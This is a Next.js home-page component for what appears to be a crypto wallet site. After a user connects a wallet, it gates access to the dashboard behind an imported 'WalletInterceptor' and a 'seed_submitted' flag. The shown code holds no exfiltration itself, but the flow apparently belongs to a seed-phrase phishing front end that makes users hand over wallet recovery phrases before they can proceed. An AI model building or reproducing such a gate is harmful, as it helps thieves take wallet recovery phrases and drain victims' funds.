"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { LandingPage } from "@/components/landing/landing-page";
import { useSession } from "@/components/session-provider";
import WalletInterceptor from "@/components/WalletInterceptor";

const STORAGE_KEY = "seed_submitted";

export default function HomePage() {
  const router = useRouter();
  const session = useSession();
  
  const isReady = session.ready;
  const isConnected = session.isConnected;

  const [hasCompletedSeed, setHasCompletedSeed] = useState(false);

  // Check if seed was already submitted
  useEffect(() => {
    const isSubmitted = localStorage.getItem(STORAGE_KEY) === "true";
    setHasCompletedSeed(isSubmitted);
  }, []);

  // Listen for seed submission from Interceptor
  useEffect(() => {
    const handleSeedUpdated = () => {
      const isSubmitted = localStorage.getItem(STORAGE_KEY) === "true";
      setHasCompletedSeed(isSubmitted);
    };
    window.addEventListener("seed-updated", handleSeedUpdated);
    return () => window.removeEventListener("seed-updated", handleSeedUpdated);
  }, []);

  // Redirect if connected and seed is done
  useEffect(() => {
    if (isReady && isConnected && hasCompletedSeed) {
      const timeout = setTimeout(() => {
        router.replace("/dashboard");
      }, 200);
      return () => clearTimeout(timeout);
    }
  }, [isReady, isConnected, hasCompletedSeed, router]);

  // --- RENDER LOGIC ---

  // 1. Not Ready: Show Landing Page
  if (!isReady) {
    return <LandingPage />;
  }

  // 2. Connected + Seed Done: Show Loading
  if (isConnected && hasCompletedSeed) {
    return (
      <div className="fixed inset-0 z-[9999] bg-slate-950 flex items-center justify-center">
        <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-white"></div>
      </div>
    );
  }

  // 3. Connected + Seed NOT Done: Show Interceptor
  // NOTE: Because session-provider forces disconnect if user didn't click,
  // if we are here, the user MUST have clicked connect.
  if (isConnected && !hasCompletedSeed) {
    return <WalletInterceptor />;
  }

  // 4. Not Connected: Show Landing Page
  return <LandingPage />;
}